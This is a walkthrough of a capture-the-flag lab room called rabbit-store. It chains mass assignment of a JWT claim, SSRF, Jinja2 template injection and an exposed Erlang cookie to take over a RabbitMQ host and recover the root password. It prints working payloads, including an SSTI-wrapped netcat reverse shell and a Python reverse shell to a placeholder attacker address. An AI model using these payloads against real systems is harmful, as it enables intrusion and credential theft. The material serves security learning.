# rabbit-store room walkthrough

port scan reveals [this output](portscan_res)

A website is found on port 80 and it includes a login/signup page

Navigating to the signup/login page is not possible since it is in a different domain (storage.cloudsite.thm), adding it to /etc/hosts (or sending a request to the IP and changing the Host header's value to storage.cloudsite.thm) fixes it (probably virtual hosting is used).

After signing up, and logging in, the site redirects to a /dashboard/inactive endpoint and we get a JWT and looking at the body claims,
```json
{"email":"admin2@cloudsite.thm2","subscription":"inactive","iat":1740473871,"exp":1740477471}
```
It includes a claim called subscription and the value is set to inactive, and we need to somehow find a way to change that to "active"?

After trying a bunch of JWT attacks and running the jwt_tool script, i came back to the signup page and sent a signup request with email, password and subscription set to active,
```json
POST /api/register

{"email":"admin2@cloudsite.thm2","subscription":"active","password":"pass"}
```
then logging in, i get a JWT with subscription set to active and a page which lets users upload a file via file-upload or a URL.

After checking the file upload feature, it looks like there is probably nothing there.

I thought trying the URL feature was interesting and wanted to test for SSRF and found out it was vulnerable to it.

using localhost as the hostname of the URI, it looked like it does send a request and fetches content from port 80.

Next step was to do a port-scan for internal services that work and i found that a couple more ports are open 
```sh
go run main.go # change the token to a valid JWT first
```
(internally, 15672, 5672).

I also tried fuzzing for different URI schemes but only HTTP worked.

The api available after logging in, it turned out i didn;t do a thorough fuzzing on it.![Alt text](./api_fuzz_res.png) I found an /api/docs endpoint that was not accessible even for active users for some reason and when trying it using the file upload URI 
```json
POST /api/docs

{
	"url": "http://localhost:3000/api/docs"
}
````
- gives a plaintext file which looks like a documentation of the api.

Inside, there is a `/api/fetch_messeges_from_chatbot` endpoint that accepts a POST request with JSON body, and sending a request with a sample body gives
```json
{
  "error": "username parameter is required"
}
```
Including a username parameter, the response reflects the value of the `username` parameter and immediately i thought this might be an SSTI.
```
  <h1>Sorry, val, our chatbot server is currently under development.</h1>
```
Sending a sample SSTI payload {{7*7}}, gives 49 which reveals the server might be using jinja2 python template engine.
```
  <h1>Sorry, 49, our chatbot server is currently under development.</h1>
```
And a final payload with
```json
{
	"username":"{{request.application.__globals__.__builtins__.__import__('os').popen('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f').read()}}"
}
```
and listening on that port locally (i used pwncat-cs), an initial foothold into the system was achieved.

I knew to look for .erlang.cookie immediately since i searched for how to test some of the open ports (4369, 25672) and found that a leaked cookie might be interesting.
```sh
find / -type f -name ".erlang.cookie" -exec ls -l {} \; 2>/dev/null
```
and it is world-readable.
We know there is a node called `rabbit` running at port 25672 from the initial scan. We can confirm that using ```epmd -names```
Using the approach that was used for couchdb privesc,
```sh
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
````
gives an erlang shell that can be used to run shell commands. Inside,
```sh
rpc:call('rabbit@forge', os, cmd, [whoami]).
```
- outputs rabbitmq (another user) and trying a reverse-shell might work here.
```sh
rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\", ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
- gives a shell with rabbitmq user.
```sh
rabbitmqctl --erlang-cookie 'ZZlngR56keT8qstM' --node rabbit@forge list_users
```
- outputs
```
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]
```
Then, export the configuration and definition for the provided node instance to a file
```sh
rabbitmqctl --erlang-cookie 'ZZlngR56keT8qstM' --node rabbit@forge export_definitions definitions.json
```
Reading the file reveals a SHA-256 hash including a salt prepended to it (32 bits). The root user's password is anything after the salt (according to the message earlier).
```sh
echo $HASH | base64 -d | xxd -p -c 36 | cut -c9- # the root user's password
```